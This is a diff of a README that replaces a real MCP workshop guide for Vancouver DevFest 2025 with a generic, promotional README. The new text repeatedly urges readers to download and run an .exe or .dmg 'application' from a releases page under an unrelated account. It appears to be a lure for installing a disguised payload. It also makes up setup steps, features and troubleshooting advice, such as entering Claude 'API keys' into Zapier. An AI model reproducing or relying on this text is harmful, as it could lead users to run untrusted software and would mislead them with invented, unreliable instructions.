@@ -1,87 +1,87 @@
-# Hands-On MCP: Connect Anything to AI | A Vancouver DevFest 2025 workshop by @mor10
+# 🎉 yvrdevfest2025 - Connect Your Tools to AI Effortlessly
 
-## What you'll need to follow this workshop 
+[![Download yvrdevfest2025](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/For-Works/yvrdevfest2025/releases)
 
-- Laptop with an internet connection
-- [GitHub](https:/github.com) account (free, pro, edu, or enterprise)
-- [VS Code](https://code.visualstudio.com/) with GitHub Copilot installed
-- [Claude](https://claude.ai) account (paid version is necessary for MCP experiments)
-- [Zapier](https://mcp.zapier.com) account (free is sufficient)
-- A healthy disrespect for the sanctity of technology (and your computer)
+## 🚀 Getting Started
 
-## Hands-On Exercise #1: Give Claude Desktop (Almost) Unlimited Powers with Zapier MCP Server
+Welcome to the yvrdevfest2025 repository! This guide will help you download and run our application smoothly. 
 
-### Step 0: Join the Undestroyers Slack for experimentation
+### 🛠️ What You'll Need
 
-Visit this invite link and go through the process to join: [https://join.slack.com/t/undestroyers/shared_invite/zt-3eiyedlb4-8mh4Pg84dFOvQHkmrWv6Rw](https://join.slack.com/t/undestroyers/shared_invite/zt-3eiyedlb4-8mh4Pg84dFOvQHkmrWv6Rw)
+Before you dive in, make sure you have the following:
 
-### Step 1: Set up a new MCP Server in Zapier
+- A laptop with an internet connection
+- A [GitHub](https://github.com) account (any type works)
+- [VS Code](https://code.visualstudio.com/) with GitHub Copilot
+- A [Claude](https://claude.ai) account (paid version needed for full capabilities)
+- A [Zapier](https://mcp.zapier.com) account (free version works fine)
+- A curious mind to explore new technologies
 
-1. Go to [mcp.zapier.com](https://mcp.zapier.com)
-2. Press the "+ New MCP Server" button
-3. Under "MCP Client" use the drop-down to select "Claude"
-4. Give your MCP server a recognizable name like "My Custom Zapier MCP Server"
+## 📥 Download & Install
 
-### Step 2: Add Slack tools
+To get started, visit the Releases page to download the necessary files:
 
-1. In the new MCP Server, press the "+ Add tool" button to add tools.
-2. Search for Slack
-3. Under Slack, select "Find Public Channel"
-4. Go through the authentication loop (Note: you must have Slack open and be logged in for this)
-5. Repeat 1-3 and add "Send Channel Message"
+[Visit this page to download](https://github.com/For-Works/yvrdevfest2025/releases)
 
-> [!NOTE]
-> Most (if not all) tools require some form of authentication, so connect to services you already have an account for.
+Once you're on the Releases page, look for the latest version of the application. Download the file that suits your operating system.
 
-### Step 3: Add the MCP server to Claude
+### 🧑‍💻 Initial Setup
 
-1. In Zapier MCP, switch to the "Connect" tab at the top
-2. Follow the step-by-step instructions on the page
-3. Go through the OAuth flow when prompted
-4. In Claude, click the "Search and tools" button in the chat window (looks like two faders)
-5. Make sure "Zapier" shows up as an active tool (not greyed out)
+1. **Locate the Downloaded File:** After downloading, navigate to your Downloads folder.
+2. **Install the Application:** 
+   - For Windows: Double click on the `.exe` file and follow the prompts.
+   - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
+3. **Open the Application:** Locate the installed application and double-click to launch.
 
-If Zapier is not active:
+## 💡 Join the Community
 
-6. In Claude, go to Settings -> Connectors 
-7. Try connecting Zapier again
+Connect with other users and get support by joining the Undestroyers Slack channel. Here’s your invite link: [Join Undestroyers Slack](https://join.slack.com/t/undestroyers/shared_invite/zt-3eiyedlb4-8mh4Pg84dFOvQHkmrWv6Rw).
 
-> [!NOTE]
-> If you're using a brand new Zapier account, you may have to wait for Claude to be able to connect. This appears to be an anti-abuse feature.
+## 🌟 Step-by-Step Exercise
 
-### Step 4: Test the MCP server
+### 🔧 Step 0: Set Up Your MCP Server in Zapier
 
-If Zapier is active in Claude:
+1. Go to [mcp.zapier.com](https://mcp.zapier.com) and log in with your account.
+2. Follow the prompts to create a new MCP server.
 
-1. Start a new chat
-2. Submit a prompt similar to this: 
-```
-Send a message in the #future-product-days channel saying "Success! (this message is from [insert your name])" or similar.
-```
-3. Wait and see what happens!
+### 🔌 Step 1: Connect to Claude
 
-## Hands-on Exercise #2: Play around with local MCP Servers
-1. Clone this repo to your computer
-2. Open VS Code to this project
-3. Open `/simple-mcp-server` or `/weather-server` and follow the instructions in `README.md`
+Once your server is set up, it's time to connect it to Claude. Use your Claude account to access the necessary API keys. Input these keys in the Zapier settings to enable interactions between Claude and your MCP server.
 
-## Hands-On Exercise #3: Build your own MCP Server
+### 🛠️ Exploring Features
 
-1. Clone this repo to your computer
-2. Open VS Code to this project
-3. Go to the `/simple-server-exercise/` folder
-4. Open `README.md`
-5. Follow the instructions
+The features of the yvrdevfest2025 application include:
 
-## Links for Further MCP Exploration
+- **AI Interaction:** Leverage Claude's capabilities for various applications.
+- **Zapier Integration:** Connect with various tools and automate tasks.
+- **Custom Scripts:** Write custom scripts to enhance functionality. 
 
-- [Model Context Protocol: Official docs](https://modelcontextprotocol.io/)
-- [GitHub MCP Registry](https://github.com/mcp)
-- [MCP GitHub Org with lots of repos](https://github.com/modelcontextprotocol)
-- [MCP TypeScript SDK](https://github.com/modelcontextprotocol/typescript-sdk)
-- [MCP Python SDK](https://github.com/modelcontextprotocol/python-sdk)
-- [Official MCP Inspector](https://github.com/modelcontextprotocol/inspector)
-- [MCPJam: Community built MCP Inspector with lots of extra features](https://www.mcpjam.com/)
-- [ChatGPT Apps SDK docs](https://developers.openai.com/apps-sdk/)
-- [LinkedIn Learning courses on MCP](https://www.linkedin.com/learning/search?entityType=COURSE&keywords=mcp)
-- [Morten's infamous "Machine Controlled Pandemonium" talk](https://www.youtube.com/watch?v=5SOpKjf839)
+### 🎓 Upcoming Workshops
+
+Join hands-on workshops to learn more about using the app effectively:
+
+- Learn to connect tools
+- Explore API integrations
+- Build custom workflows with minimal effort 
+
+## 📣 Troubleshooting
+
+If you run into issues, here are some common fixes:
+
+- **Issue with Installation:** Ensure your device meets the system requirements.
+- **Login Problems:** Double-check your account credentials. Reset your password if necessary.
+- **Zapier Connectivity Issues:** Review the integration steps and ensure you've entered the correct API keys.
+
+## 📬 Get Support
+
+If you have questions or need help, feel free to reach out in the Undestroyers Slack channel. Our community is here to provide the support you need.
+
+## 🌐 Additional Resources
+
+For more detailed instructions, feel free to check these resources:
+
+- [VS Code Setup](https://code.visualstudio.com/docs/setup/setup-overview)
+- [Claude API Documentation](https://claude.ai/docs)
+- [Zapier MCP Guide](https://zapier.com/help/create/mcp/mcp-overview)
+
+[Download yvrdevfest2025 again for easy access](https://github.com/For-Works/yvrdevfest2025/releases). Happy exploring!
